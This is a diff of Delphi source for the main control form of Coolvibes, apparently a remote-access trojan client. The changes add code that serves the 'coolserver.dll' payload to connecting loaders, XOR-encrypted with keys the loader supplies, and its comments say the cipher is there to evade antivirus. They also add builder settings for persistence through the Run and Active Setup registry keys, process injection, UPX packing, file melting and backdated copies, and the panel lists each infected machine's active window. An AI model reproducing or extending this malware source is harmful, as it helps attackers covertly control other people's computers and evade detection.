@@ -92,6 +92,7 @@ type
     N3:     TMenuItem;
     wwwindetectablesnet1: TMenuItem;
     NotificacinestiloMSN1: TMenuItem;
+    TimerMandarPing: TTimer;
     procedure BtnEscucharClick(Sender: TObject);
     procedure ListViewConexionesContextPopup(Sender: TObject;
       MousePos: TPoint; var Handled: boolean);
@@ -112,26 +113,31 @@ type
       Item1, Item2: TListItem; Data: integer; var Compare: integer);
     procedure FormCreate(Sender: TObject);
     procedure FormShow(Sender: TObject);
-    procedure FormDestroy(Sender: TObject);
     procedure MostrarOcultar1Click(Sender: TObject);
     procedure Salir1Click(Sender: TObject);
     procedure NotificacinestiloMSN1Click(Sender: TObject);
     procedure PopupMenuTrayPopup(Sender: TObject);
     procedure wwwindetectablesnet1Click(Sender: TObject);
+    procedure TimerMandarPingTimer(Sender: TObject);
+    procedure ListViewConexionesColumnRightClick(Sender: TObject;
+      Column: TListColumn; Point: TPoint);
+    procedure PopupMenuConexionesPopup(Sender: TObject);
+    procedure GloboEmergente(titulo:string;mensaje:string;tipo:cardinal);
   private
     ColumnaOrdenada, Columna: integer;
     //Para saber por que columna está ordenado el listviewconexiones
-
     TrayIconData: TNotifyIconData;
     //El record dodne se guarda la información del icono de la tray
-
     procedure OnPopMessage(var Msg: TMessage); message WM_POP_MESSAGE;
     procedure TrayMessage(var Msg: TMessage); message WM_ICONTRAY;
     procedure NotiMsnDesconect(tItem: TListItem);
   public
+    Columnas : array[0..8] of string; //Para saber el orden de las columnas
+    NotificandoOnline: Boolean; //Si estamos notificando alguna conexión
     procedure FormCloseQuery(Sender: TObject; var CanClose: boolean);
     procedure FormCloseQueryMinimizarAlTray(Sender: TObject; var CanClose: boolean);
     procedure MinimizeToTrayClick(Sender: TObject);
+    function  buscaridcolumnapornombre(nombre:string):integer;
   end;
 
 var
@@ -141,7 +147,8 @@ var
 
 implementation
 
-uses UnitOpciones, UnitAbout, UnitID, UnitFormConfigServer;
+uses UnitOpciones, UnitAbout, UnitID, UnitFormConfigServer,
+  UnitColumnasManager;
 
 {$R *.dfm}
 
@@ -151,7 +158,8 @@ begin
   GuardarArchivoINI();
   if ServerSocket.Active then
     BtnEscuchar.Click;
-    exitprocess(0);
+  Shell_NotifyIcon(NIM_DELETE, @TrayIconData);
+  exitprocess(0);
 end;
 
 procedure TFormMain.FormCloseQuery(Sender: TObject; var CanClose: boolean);
@@ -197,7 +205,7 @@ begin
   if BtnEscuchar.Caption = 'Escuchar' then
   begin
     try
-      ServerSocket.DefaultPort := StrToInt(FormOpciones.EditPuerto.Text);
+      ServerSocket.DefaultPort := StrToIntdef(FormOpciones.EditPuerto.Text,80);
       ServerSocket.Active := True;
       FormOpciones.EditPuerto.Enabled := False;
       BtnEscuchar.Caption := 'Detener';
@@ -208,13 +216,15 @@ begin
     end;
     try
       h := TBitmap.Create;
-      h.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'Imagenes\detener.bmp');
+      h.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'Recursos\Imagenes\detener.bmp');
       BtnEscuchar.Glyph := h;
+
     except
       MessageDlg('No se puede cargar la imagen: ' + ExtractFilePath(ParamStr(0)) +
-        'Imagenes\detener.bmp', mtWarning, [mbOK], 0);
+        'Recursos\Imagenes\detener.bmp', mtWarning, [mbOK], 0);
     end;
     h.Free;
+
     StatusBar.Panels[0].Text := 'Esperando conexiones';
     StatusBar.Panels[1].Text := 'Puerto: ' + FormOpciones.EditPuerto.Text;
   end
@@ -237,18 +247,18 @@ begin
     ServerSocket.Threads.Clear;
     ServerSocket.Threads.UnlockList;
     ServerSocket.Active := False;
-
+    ServerSocket.Bindings.Clear;
     ListViewConexiones.Clear;
     FormOpciones.EditPuerto.Enabled := True;
     BtnEscuchar.Caption := 'Escuchar';
     Escuchar1.Checked   := False;
     try
       h := TBitmap.Create;
-      h.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'Imagenes\escuchar.bmp');
+      h.LoadFromFile(ExtractFilePath(ParamStr(0)) + 'Recursos\Imagenes\escuchar.bmp');
       BtnEscuchar.Glyph := h;
     except
       MessageDlg('No se puede cargar la imagen: ' + ExtractFilePath(ParamStr(0)) +
-        'Imagenes\escuchar.bmp', mtWarning, [mbOK], 0);
+        'Recursos\Imagenes\escuchar.bmp', mtWarning, [mbOK], 0);
     end;
     h.Free;
     StatusBar.Panels[0].Text := 'Escucha detenida';
@@ -264,10 +274,13 @@ var
   i:    integer;
 begin
   item := TListItem(Msg.Wparam);
-  VentanaNotifica := TFormNotifica.Create(self, Item);
-  VentanaNotifica.Show;
-  VentanaNotifica.Timer.Enabled := True;
-
+  if not NotificandoOnline then
+  begin
+    NotificandoOnline := True;
+    VentanaNotifica := TFormNotifica.Create(self, Item);
+    VentanaNotifica.Show;
+    VentanaNotifica.Timer.Enabled := True;
+  end;
 end;
 
 //Eventos del ServerSocket
@@ -302,6 +315,18 @@ begin
   finally
     ServerSocket.Threads.UnlockList();
   end;
+
+  StatusBar.Panels[0].Text := 'Numero de conexiones: '+inttostr(Listviewconexiones.Items.count);
+end;
+
+function TFormMain.buscaridcolumnapornombre(nombre:string):integer; //devuelve el id de una columna conociendo su caption
+var
+  i : integer;
+begin
+  Result := -1;
+  for i:= 0 to listviewconexiones.columns.count-1 do
+       if Listviewconexiones.Column[i].Caption = nombre then
+          Result := i-1;
 end;
 
 procedure TFormMain.ServerSocketExecute(AThread: TIdPeerThread);
@@ -311,6 +336,7 @@ var
   Buffer: ansistring;
   Recibido, IP: string;
   SHP:    HWND;
+  TmpServDLL : string;
 begin
   try
     Buffer := Trim(Athread.Connection.ReadLn);
@@ -326,15 +352,30 @@ begin
   begin
     Athread.Connection.WriteLn('PONG');
   end
-    else if Buffer = 'GETSERVER' then         //conectador.dll nos está pidiendo el servidor
-  begin
+    else if Copy(Buffer, 1, 9) = 'GETSERVER' then         //conectador.dll nos está pidiendo el servidor
+  begin                           //GETSERVER|clavecifrado1|clavecifrado2|
+   Recibido := buffer;
+   Delete(Recibido, 1, Pos('|', Recibido)); //quitamos el GETSERVER|
+
   //Globo emergente de intento de conexión ??
-    Athread.Connection.Write(#14+inttostr(length(servdll))+#14+servdll);
+    TmpServDLL := ServDll;
+    if NotificacionMsn then //solo si está activa la notificación MSN de lo contrario podría molestar
+      GloboEmergente('Pidiendo Servidor', 'Pidiendo Servidor', NIIF_INFO);
+    for i := 1 to length(ServDLL) do  //con la primera clave
+      TmpServDLL[i] := chr(ord(TmpServDLL[i]) xor strtoint(Copy(Recibido, 1, Pos('|', Recibido) - 1)));//funcion de cifrado simple para evadir antiviruses
+    Delete(Recibido, 1, Pos('|', Recibido));
+    for i := 1 to length(ServDLL) do
+      TmpServDLL[i] := chr(ord(TmpServDLL[i]) xor strtoint(Copy(Recibido, 1, Pos('|', Recibido) - 1)));//funcion de cifrado simple para evadir antiviruses
+
+
+    Athread.Connection.Write(#14+inttostr(length(TmpServDLL))+#14+TmpServDLL);
   end
-  else if Buffer = 'PONG' then  //Tiempo actual menos almacenado
+  else if Copy(Buffer, 1, 4) = 'PONG' then
   begin
-    item := TListItem(Athread.Data);
-    Ping := GetTickCount() - cardinal(Item.SubItems.Objects[2]);
+  item := TListItem(Athread.Data);
+  Ping := GetTickCount() - cardinal(Item.SubItems.Objects[2]); //Tiempo actual menos almacenado
+
+
     case Ping of
       0..50: item.ImageIndex    := 3; //Ping perfecto
       51..100: item.ImageIndex  := 4; //Ping bueno
@@ -342,7 +383,18 @@ begin
       else
         item.ImageIndex := 6; //Ping malo
     end;
-    item.SubItems[4] := IntToStr(Ping);
+
+    Recibido := Buffer;
+    Delete(Recibido, 1, Pos('|', Recibido)); //quitamos el PONG
+    for i := 1 to 8 do
+    begin
+      Delete(Recibido, 1, Pos('|', Recibido));
+       if(buscaridcolumnapornombre(Columnas[i]) <> -1) then
+          Item.SubItems[buscaridcolumnapornombre(columnas[i])] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+    end;
+    if(buscaridcolumnapornombre(Columnas[5]) <> -1) then
+      item.SubItems[buscaridcolumnapornombre(Columnas[5])] := IntToStr(Ping);
+
     Exit;
   end;
 
@@ -378,7 +430,9 @@ begin
     item.SubItems.Add(' ');
     item.SubItems.Add(' ');
     item.SubItems.Add(' ');
-
+    item.SubItems.Add(' ');
+    item.SubItems.Add(' ');
+    item.SubItems.Add(' ');
     //El primer Objeto que guardamos en el Item es el Athread
     item.SubItems.Objects[0] := Athread;
     //Como segundo objeto guardaremos la Form
@@ -389,13 +443,12 @@ begin
     IP := '[' + Item.Caption + ']';
     Item.Caption := Item.Caption + '/' + Copy(Recibido, 1, Pos('|', Recibido) - 1);
 
-    Delete(Recibido, 1, Pos('|', Recibido));
-    Item.SubItems[0] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
 
-    for i := 1 to 3 do  //El resto de valores los copiamos tal cual
+    for i := 1 to 8 do  //El resto de valores los copiamos tal cual
     begin
       Delete(Recibido, 1, Pos('|', Recibido));
-      Item.SubItems[i] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+       if(buscaridcolumnapornombre(Columnas[i]) <> -1) then
+          Item.SubItems[buscaridcolumnapornombre(columnas[i])] := Copy(Recibido, 1, Pos('|', Recibido) - 1);
     end;
     //    AThread.Connection.WriteLn('GETSH|'+IntToStr(AThread.Handle));
     //Mostramos la notificación
@@ -423,6 +476,8 @@ begin
         exit;
       end;
   end;
+
+   StatusBar.Panels[0].Text := 'Numero de conexiones: '+inttostr(Listviewconexiones.Items.count);
 end;
 //Fin de eventos del ServerSocket
 
@@ -459,11 +514,15 @@ begin
   begin
     Athread := TIdPeerThread(ListViewConexiones.Selected.SubItems.Objects[0]);
     NuevaVentanaControl := TFormControl.Create(self, Athread);
+    NuevaVentanaControl.PageControl.ActivePage := NuevaVentanaControl.TabServidor;
     ListViewConexiones.Selected.SubItems.Objects[1] := NuevaVentanaControl;
-    NuevaVentanaControl.Caption :=
-      'Centro de control: ' + ListViewConexiones.Selected.SubItems[0] +
+    if(buscaridcolumnapornombre(Columnas[1]) <> -1) then
+    begin
+      NuevaVentanaControl.Caption :=
+      'Centro de control: ' + ListViewConexiones.Selected.SubItems[buscaridcolumnapornombre(columnas[1])] +
       ' ' + Athread.Connection.Socket.Binding.PeerIP;
-    NuevaVentanaControl.NombrePC := ListViewConexiones.Selected.SubItems[0];
+      NuevaVentanaControl.NombrePC := ListViewConexiones.Selected.SubItems[buscaridcolumnapornombre(columnas[1])];
+    end;
     NuevaVentanaControl.Show;
   end;
 end;
@@ -473,10 +532,13 @@ var
   i: integer;
   AThread: TIdPeerThread;
 begin
-  AThread := TidPeerThread(ListViewConexiones.Selected.SubItems.Objects[0]);
-  AThread.Connection.WriteLn('PING');
-  //Como objeto 2 guardamos una captura del tiempo en milisegundos
-  ListViewConexiones.Selected.SubItems.Objects[2] := TObject(GetTickCount());
+if(listviewconexiones.selected.SubItems[buscaridcolumnapornombre(Columnas[5])] <> '.') then
+begin
+    AThread := TidPeerThread(ListViewConexiones.Selected.SubItems.Objects[0]);
+    AThread.Connection.WriteLn('PING');
+    //Como objeto 2 guardamos una captura del tiempo en milisegundos
+    ListViewConexiones.Selected.SubItems.Objects[2] := TObject(GetTickCount());
+end;
 end;
 
 procedure TFormMain.Cambiarnombre1Click(Sender: TObject);
@@ -524,7 +586,10 @@ end;
 //Funciones para leer y guardar la configuración en el archivo .INI
 procedure TFormMain.LeerArchivoINI();
 var
-  Ini: TIniFile;
+  Ini     : TIniFile;
+  i       : integer;
+  c       : TListColumn;
+  TempStr : string;
 begin
   try
     Ini := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'Configuracion.ini');
@@ -546,33 +611,77 @@ begin
         Ini.ReadBool('Opciones', 'MinimizarAlTray', False);
       CheckBoxCloseToTray.Checked :=
         Ini.ReadBool('Opciones', 'CerrarAlTray', False);
+      CheckBoxEscucharAlIniciar.Checked :=
+        Ini.ReadBool('Opciones', 'EscucharAlIniciar', False);
+      CheckBoxMandarPingAuto.Checked :=
+        Ini.ReadBool('Opciones', 'MandarPingAuto', True);
+      EditPingTimerInterval.Text :=
+        Ini.ReadString('Opciones', 'PingTimerInterval', '30');
+      CheckBoxAutoRefrescar.Checked :=
+        Ini.ReadBool('Opciones', 'AutoRefrescar', False);
     end;
     //Valores de la Form de Configuracion del server
     with FormConfigServer do
     begin
       EditID.Text     :=
         Ini.ReadString('ConfigurarServidor', 'ID', 'CoolID');
-      EditPuerto.Text :=
-        Ini.ReadString('ConfigurarServidor', 'Puerto', '3360');
-      EditIP.Text     :=
-        Ini.ReadString('ConfigurarServidor', 'IP', '127.0.0.1');
+      IPsyPuertos     :=
+        Ini.ReadString('ConfigurarServidor', 'Conectar', '127.0.0.1:80¬');
       EditPluginName.Text :=
-        Ini.ReadString('ConfigurarServidor', 'NombrePlugin', 'Plugi.dat');
+        Ini.ReadString('ConfigurarServidor', 'NombrePlugin', '0k3n.dat');
       CheckBoxCopiar.Checked :=
         Ini.ReadBool('ConfigurarServidor', 'CopiarArchivo', False);
       EditFileName.Text :=
         Ini.ReadString('ConfigurarServidor', 'NombreArchivo', 'coolserver.exe');
       EditCopyTo.Text :=
-        Ini.ReadString('ConfigurarServidor', 'RutaCopiarA', '%WinDir%\');
+        Ini.ReadString('ConfigurarServidor', 'RutaCopiarA', '%AppDir%\');
       CheckBoxMelt.Checked :=
         Ini.ReadBool('ConfigurarServidor', 'Melt', False);
       CheckBoxCopiarConFechaAnterior.Checked :=
         Ini.ReadBool('ConfigurarServidor', 'CopiarConFechaAnterior', False);
       CheckBoxRun.Checked :=
         Ini.ReadBool('ConfigurarServidor', 'MetodoRun', False);
+      CheckBoxActiveSetup.Checked :=
+        Ini.ReadBool('ConfigurarServidor', 'MetodoActiveSetup', False);
       EditRunName.Text :=
         Ini.ReadString('ConfigurarServidor', 'ValorRun', 'coolserver');
+      EditActiveSetup.Text :=
+        Ini.ReadString('ConfigurarServidor', 'ValorActiveSetup', '');
+      CheckBoxInyectar.Checked :=
+        Ini.ReadBool('ConfigurarServidor', 'Inyectar', False);
+      CheckBoxPersistencia.Checked :=
+        Ini.ReadBool('ConfigurarServidor', 'Persistencia', False);
+      CheckBoxUPX.Checked :=
+        Ini.ReadBool('ConfigurarServidor', 'ComprimirUPX', False);
+      CheckBoxCifrar.Checked :=
+        Ini.ReadBool('ConfigurarServidor', 'Cifrar', False);
+
     end;
+
+    Listviewconexiones.columns.Clear;
+    Columnas[0] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre0', 'IP');
+    Columnas[1] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre1', 'Nombre');
+    Columnas[2] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre2', 'CPU');
+    Columnas[3] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre3', 'SO');
+    Columnas[4] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre4', 'Versión');
+    Columnas[5] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre5', 'Ping');
+    Columnas[6] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre6', 'Ventana activa');
+    Columnas[7] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre7', 'TSU');
+    Columnas[8] :=Ini.ReadString('AparienciaCliente', 'ColumnaNombre8', 'Encendido hace');
+
+    for i:=0 to 8 do
+    begin
+       if Ini.ReadBool('AparienciaCliente', 'Columna'+inttostr(i)+'Mostrandose', true) then
+       begin
+          c := Listviewconexiones.columns.Add;
+          c.Caption:= Ini.ReadString('AparienciaCliente', 'Columna'+inttostr(i)+'Caption', columnas[i]);
+          c.width := Ini.ReadInteger('AparienciaCliente', 'Columna'+inttostr(i)+'Width',100);
+       end;
+    end;
+
+    self.Width := Ini.ReadInteger('AparienciaCliente', 'FormMainWidth',self.Width);
+    self.Height := Ini.ReadInteger('AparienciaCliente', 'FormMainHeight',self.Height);
+
   finally
     Ini.Free;
   end;
@@ -582,6 +691,8 @@ end;
 procedure TFormMain.GuardarArchivoINI();
 var
   Ini: TIniFile;
+  i:   integer;
+  TempStr : string;
 begin
   try
     Ini := TIniFile.Create(ExtractFilePath(ParamStr(0)) + 'Configuracion.ini');
@@ -597,11 +708,16 @@ begin
       FormOpciones.CheckBoxNotificacionMsn.Checked);
     Ini.WriteBool('Opciones', 'NotiMsnServerDesc',
       FormOpciones.CheckBoxNotiMsnDesc.Checked);
-
+    Ini.WriteBool('Opciones', 'MandarPingAuto',
+      FormOpciones.CheckBoxMandarPingAuto.Checked);
+    Ini.WriteBool('Opciones', 'EscucharAlIniciar',
+      FormOpciones.CheckBoxEscucharAlIniciar.Checked);
+    Ini.WriteString('Opciones', 'PingTimerInterval', FormOpciones.EditPingTimerInterval.text);
+    Ini.WriteBool('Opciones', 'AutoRefrescar',
+      FormOpciones.CheckBoxAutoRefrescar.Checked);
     //Valores de la Form de Configuracion del server
     Ini.WriteString('ConfigurarServidor', 'ID', FormConfigServer.EditID.Text);
-    Ini.WriteString('ConfigurarServidor', 'Puerto', FormConfigServer.EditPuerto.Text);
-    Ini.WriteString('ConfigurarServidor', 'IP', FormConfigServer.EditIP.Text);
+    Ini.WriteString('ConfigurarServidor', 'Conectar', FormConfigServer.ipsypuertos);
     Ini.WriteString('ConfigurarServidor', 'NombrePlugin',
       FormConfigServer.EditPluginName.Text);
     Ini.WriteBool('ConfigurarServidor', 'CopiarArchivo',
@@ -613,10 +729,50 @@ begin
     Ini.WriteBool('ConfigurarServidor', 'Melt', FormConfigServer.CheckBoxMelt.Checked);
     Ini.WriteBool('ConfigurarServidor', 'CopiarConFechaAnterior',
       FormConfigServer.CheckBoxCopiarConFechaAnterior.Checked);
-    Ini.WriteBool('ConfigurarServidor', 'MetodoPolicies',
+    Ini.WriteBool('ConfigurarServidor', 'MetodoRun',
       FormConfigServer.CheckBoxRun.Checked);
     Ini.WriteString('ConfigurarServidor', 'ValorRun',
       FormConfigServer.EditRunName.Text);
+    Ini.WriteBool('ConfigurarServidor', 'MetodoActiveSetup',
+      FormConfigServer.CheckBoxActiveSetup.Checked);
+    Ini.WriteString('ConfigurarServidor', 'ValorActiveSetup',
+      FormConfigServer.EditActiveSetup.Text);
+    Ini.WriteBool('ConfigurarServidor', 'Inyectar',
+      FormConfigServer.CheckBoxInyectar.Checked);
+    Ini.WriteBool('ConfigurarServidor', 'Persistencia',
+      FormConfigServer.CheckBoxPersistencia.Checked);
+    Ini.WriteBool('ConfigurarServidor', 'ComprimirUPX',
+      FormConfigServer.CheckBoxUPX.Checked);
+    Ini.WriteBool('ConfigurarServidor', 'Cifrar',
+      FormConfigServer.CheckBoxCifrar.Checked);
+
+
+      //Guardamos el estado de las columnas del Tlistview :D
+      for i:=0 to 8 do
+        Ini.WriteBool('AparienciaCliente', 'Columna'+inttostr(i)+'Mostrandose', false);//ponemos todas como ocultas
+
+      for i:=0 to Listviewconexiones.columns.Count-1 do
+      begin
+        Ini.WriteBool('AparienciaCliente', 'Columna'+inttostr(i)+'Mostrandose', true);
+        Ini.WriteString('AparienciaCliente', 'Columna'+inttostr(i)+'Caption', Listviewconexiones.columns[i].Caption);
+        Ini.WriteInteger('AparienciaCliente', 'Columna'+inttostr(i)+'Width',Listviewconexiones.columns[i].Width);
+      end;
+
+
+
+    Ini.WriteString('AparienciaCliente', 'ColumnaNombre0', Columnas[0]);
+    Ini.WriteString('AparienciaCliente', 'ColumnaNombre1', Columnas[1]);
+    Ini.WriteString('AparienciaCliente', 'ColumnaNombre2', Columnas[2]);
+    Ini.WriteString('AparienciaCliente', 'ColumnaNombre3', Columnas[3]);
+    Ini.WriteString('AparienciaCliente', 'ColumnaNombre4', Columnas[4]);
+    Ini.WriteString('AparienciaCliente', 'ColumnaNombre5', Columnas[5]);
+    Ini.WriteString('AparienciaCliente', 'ColumnaNombre6', Columnas[6]);
+    Ini.WriteString('AparienciaCliente', 'ColumnaNombre7', Columnas[7]);
+    Ini.WriteString('AparienciaCliente', 'ColumnaNombre8', Columnas[8]);
+    Ini.WriteInteger('AparienciaCliente', 'FormMainHeight',self.Height);
+    Ini.WriteInteger('AparienciaCliente', 'FormMainWidth',self.Width);
+
+
   finally
     Ini.Free;
   end;
@@ -625,9 +781,9 @@ end;
 
 procedure TFormMain.FormCreate(Sender: TObject);
 var
-ServerFile             :File;
-Tamano : integer;
-i : integer;
+  ServerFile             : File;
+  Tamano                 : integer;
+  i                      : integer;
 begin
   Application.OnMinimize := MinimizeToTrayClick;
 
@@ -644,64 +800,68 @@ begin
 
   Self.Caption := 'Coolvibes '+VersionCool+' Update '+UpdateNum+' ::   [ www.indetectables.net ]';
 
-   if fileexists(extractfiledir(paramstr(0))+'\servidores\coolserver.dll')      then
-   begin
-
-  FileMode := 0;
-  AssignFile(ServerFile, extractfiledir(paramstr(0))+'\servidores\coolserver.dll');     //archivo de CoolServer
-  Reset(ServerFile, 1);
-  tamano := FileSize(ServerFile);
-  SetLength(Servdll, tamano);
-  BlockRead(ServerFile, Servdll[1], tamano);  //cargado archivo a servdll
-  CloseFile(ServerFile);
-
-  for i := 1 to length(ServDLL) do
+  if fileexists(extractfiledir(paramstr(0))+'\Recursos\coolserver.dll')      then
   begin
-    ServDLL[i] := chr(ord(ServDLL[i]) xor 66);//funcion de cifrado simple para evadir antiviruses, en el futuró deberá ser dinamica
-  end;
+
+    FileMode := 0;
+    AssignFile(ServerFile, extractfiledir(paramstr(0))+'\Recursos\coolserver.dll');     //archivo de CoolServer
+    Reset(ServerFile, 1);
+    tamano := FileSize(ServerFile);
+    SetLength(Servdll, tamano);
+    BlockRead(ServerFile, Servdll[1], tamano);  //cargado archivo a servdll
+    CloseFile(ServerFile);
+
+
 
   end
   else
-  MessageDlg('CoolServer.dll no existe, no se podrán mandar servidores', mtWarning, [mbOK], 0);
+    MessageDlg('CoolServer.dll no existe, no se podrán mandar servidores', mtWarning, [mbOK], 0);
+
+
 end;
 // para el globo emergente
+procedure TFormMain.GloboEmergente(titulo:string;mensaje:string;tipo:cardinal);
+begin
+  TrayIconData.cbSize := SizeOf(TrayIconData);
+  TrayIconData.uFlags := NIF_INFO;
+  strPLCopy(TrayIconData.szInfo, Mensaje, SizeOf(TrayIconData.szInfo) - 1);
+  TrayIconData.DUMMYUNIONNAME.uTimeout := 300;
+  strPLCopy(TrayIconData.szInfoTitle, Titulo, SizeOf(TrayIconData.szInfoTitle) - 1);
+  TrayIconData.dwInfoFlags := tipo;
+  //NIIF_INFO;     //NIIF_ERROR;  //NIIF_WARNING;
+  Shell_NotifyIcon(NIM_MODIFY, @TrayIconData);
+  {in my testing, the following code has no use}
+  TrayIconData.DUMMYUNIONNAME.uVersion := NOTIFYICON_VERSION;
+  Shell_NotifyIcon(NIM_SETVERSION, @TrayIconData);
+end;
+
 procedure TFormMain.NotiMsnDesconect(tItem: TListItem);
 var
   Mensaje, Titulo: string;
   Item: TListItem;
 begin
   item    := tItem;
-  TrayIconData.cbSize := SizeOf(TrayIconData);
-  TrayIconData.uFlags := NIF_INFO;
   Mensaje := 'La IP es :' + Item.Caption;
-  strPLCopy(TrayIconData.szInfo, Mensaje, SizeOf(TrayIconData.szInfo) - 1);
-  TrayIconData.DUMMYUNIONNAME.uTimeout := 300;
-  Titulo := Item.SubItems[0] + ' Desconectandose';
-  strPLCopy(TrayIconData.szInfoTitle, Titulo, SizeOf(TrayIconData.szInfoTitle) - 1);
-  TrayIconData.dwInfoFlags := NIIF_WARNING;
-  //NIIF_INFO;     //NIIF_ERROR;  //NIIF_WARNING;
-  Shell_NotifyIcon(NIM_MODIFY, @TrayIconData);
-  {in my testing, the following code has no use}
-  TrayIconData.DUMMYUNIONNAME.uVersion := NOTIFYICON_VERSION;
-  if not Shell_NotifyIcon(NIM_SETVERSION, @TrayIconData) then
-    ShowMessage('Ha fallado la creación del icono en la barra de notificación.');
-
+  Titulo := Item.SubItems[buscaridcolumnapornombre(columnas[1])] + ' Desconectandose';
+  GloboEmergente(Titulo,Mensaje,NIIF_ERROR);
 end;
 
 procedure TFormMain.FormShow(Sender: TObject);
 begin
+  
   if PrimeraVezQueMeMuestro then
   begin
     StatusBar.Panels[0].Text := 'Estado: No escuchando';
     LeerArchivoINI();
     PrimeraVezQueMeMuestro := False;
+    if FormOpciones.CheckBoxEscucharAlIniciar.Checked then
+      BtnEscuchar.Click;
+    TimerMandarPing.Interval := strtointdef(FormOpciones.EditPingTimerInterval.Text, 30)*1000;
+    TimerMandarPing.Enabled := FormOpciones.CheckBoxMandarPingAuto.Checked;
   end;
+
 end;
 
-procedure TFormMain.FormDestroy(Sender: TObject);
-begin
-  Shell_NotifyIcon(NIM_DELETE, @TrayIconData);
-end;
 
 procedure TFormMain.TrayMessage(var Msg: TMessage);
 var
@@ -766,6 +926,36 @@ end;
 procedure TFormMain.wwwindetectablesnet1Click(Sender: TObject);
 begin
   ShellExecute(Handle, 'open', 'http://www.indetectables.net', '', '', SW_SHOW);
+end;
+
+procedure TFormMain.TimerMandarPingTimer(Sender: TObject);
+var
+  i:integer;
+  AThread: TIdPeerThread;
+begin //Mandar Ping cada 30 segundos
+  for i:=0 to listviewconexiones.Items.Count-1 do
+  begin
+    if((ListViewConexiones.items[i].SubItems[buscaridcolumnapornombre(Columnas[5])] <> '.') and (ListViewConexiones.items[i].SubItems.Objects[0] <> nil) ) then //solo si no estamos mandando ping
+    begin
+      AThread := TidPeerThread(ListViewConexiones.items[i].SubItems.Objects[0]);
+      AThread.Connection.WriteLn('PING');
+      //Como objeto 2 guardamos una captura del tiempo en milisegundos
+      ListViewConexiones.items[i].SubItems.Objects[2] := TObject(GetTickCount());
+    end;
+  end;
+end;
+
+procedure TFormMain.ListViewConexionesColumnRightClick(Sender: TObject;
+  Column: TListColumn; Point: TPoint);
+begin
+FormColumnasManager.show;
+end;
+
+procedure TFormMain.PopupMenuConexionesPopup(Sender: TObject);
+begin
+  if FormColumnasManager.Showing then
+    FormColumnasManager.FocusControl(nil);
+
 end;
 
 end.
